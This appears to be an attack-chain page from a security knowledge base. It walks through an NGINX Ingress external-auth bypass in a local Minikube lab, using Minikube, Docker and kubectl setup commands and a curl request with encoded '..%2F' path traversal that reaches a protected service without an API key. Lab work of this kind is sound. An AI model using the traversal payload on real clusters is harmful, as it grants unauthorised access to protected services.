---
tags:
  - kubernetes
  - nginx-ingress
  - auth-bypass
  - path-traversal
  - external-auth
type: attack_chain
tools:
  - '[[tools/Minikube]]'
  - '[[tools/Docker]]'
  - '[[tools/kubectl]]'
  - '[[tools/curl]]'
  - '[[tools/NGINX-Ingress-Controller]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Kubernetes
  - Docker
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Setup-Minikube-and-Deploy-Vulnerable-Kubernetes-Config]]'
  - '[[procedures/Verify-Normal-Service-Access]]'
  - '[[procedures/Exploit-Path-Traversal-for-Auth-Bypass]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:31:19.490Z'
description: >-
  Multi-stage attack exploiting improper URL normalization in NGINX Ingress
  controller's external authentication, allowing path traversal to bypass auth
  for protected Kubernetes services.
skill_level: intermediate
impact_level: high
id: 83d9e87e-8d6a-4507-9bbd-4c0119eea322
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
---
# NGINX Ingress Authentication Bypass via Encoded Path Traversal

Multi-stage attack chain demonstrating authentication bypass in Kubernetes using NGINX Ingress controller's external auth mechanism. The exploit leverages encoded path traversal ('..%2F') to manipulate headers sent to the auth service, tricking it into approving access to protected endpoints based on a public path prefix.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~30 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Environment] --> B[Verify Normal Access]
    B --> C[Exploit Path Traversal]
    C --> D[Unauthorized Access Achieved]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Minikube]]
- [[tools/Docker]]
- [[tools/kubectl]]
- [[tools/curl]]

### Target Environment

- Kubernetes cluster (local via Minikube v1.23.2)
- NGINX Ingress Controller v1.0.0-beta.3
- Services on port 8080
- Docker 20.10.8 for image building

### Initial Access Requirements

- Local machine with admin privileges for Minikube installation
- Access to download Kubernetes configs (k8s-ingress-auth-bypass.zip)
- No remote network access needed; local cluster simulation

## Detailed Attack Procedures

### Step 1: Environment Setup and Deployment
procedure: [[procedures/Setup-Minikube-and-Deploy-Vulnerable-Kubernetes-Config]]

**Objective**: Establish a local Kubernetes environment with vulnerable NGINX Ingress configuration, including auth, protected, and public services.

**Instructions**: Install Minikube, build and load Docker images, then deploy the application manifests. This sets up the ingress with external auth URL pointing to the auth-service.

Use [[commands/install-minikube]] to set up the cluster:

```bash
# Install Minikube v1.23.2 (platform-specific installer)
```

Enable addons with [[commands/enable-minikube-addons]]:

```bash
minikube addons enable ingress
minikube addons enable ingress-dns
```

Build images using [[commands/docker-build-auth-service]]:

```bash
cd auth-service; docker build -t auth-service:0.0.4 .
```

Similarly for other services with [[commands/docker-build-protected-service]] and [[commands/docker-build-public-service]]:

```bash
cd protected-service; docker build -t protected-service:0.0.1 .
cd public-service; docker build -t public-service:0.0.1 .
```

Load images into Minikube using [[commands/minikube-load-auth-image]] etc.:

```bash
minikube image load auth-service:0.0.4
minikube image load protected-service:0.0.1
minikube image load public-service:0.0.1
```

Deploy with [[commands/kubectl-apply-app]]:

```bash
kubectl apply -f app.yaml
```

**Expected Output**: Pods running, ingress active at app.test.

**Success Indicators**:
- Minikube cluster status: running
- All services deployed without errors
- Ingress controller pod ready

### Step 2: Verify Normal Service Access
procedure: [[procedures/Verify-Normal-Service-Access]]

**Objective**: Confirm that public service is accessible without auth and protected service requires valid API key, validating the baseline setup.

**Instructions**: Send requests to endpoints to ensure normal behavior before exploitation.

Access public service with [[commands/curl-public-service]]:

```bash
curl -v http://app.test/public-service/public
```

Access protected service with valid key using [[commands/curl-protected-service-valid]]:

```bash
curl -v http://app.test/protected-service/protected -H "X-Api-Key: secret-api-key"
```

**Expected Output**: 200 OK for public; 204 from auth then protected response for valid key.

**Success Indicators**:
- Public endpoint returns content without headers
- Protected endpoint succeeds only with API key, fails without

### Step 3: Exploit Path Traversal for Auth Bypass
procedure: [[procedures/Exploit-Path-Traversal-for-Auth-Bypass]]

**Objective**: Craft a malicious request using encoded path traversal to manipulate X-Original-Url and X-Auth-Request-Redirect headers, bypassing auth for protected service.

**Instructions**: Target the public path but traverse to protected using '..%2F' encoding, causing the auth service to validate against the public prefix.

Execute the exploit with [[commands/curl-path-traversal-exploit]]:

```bash
curl -v http://app.test/public-service/..%2Fprotected-service/protected
```

**Expected Output**: 204 from auth service (approval) followed by unauthorized access to protected content, without providing API key.

**Success Indicators**:
- Response from protected service without auth failure
- Headers show manipulated URL in auth request
- No 401/403 errors

## Attack Chain Summary

### Key Achievements

1. Successful deployment of vulnerable Kubernetes ingress with external auth
2. Verification of auth enforcement in baseline
3. Bypassing auth via path traversal, gaining unauthorized access to protected resources

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Valid Accounts]] Valid Accounts

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

---
*Last updated: 2023-10-01T00:00:00Z*
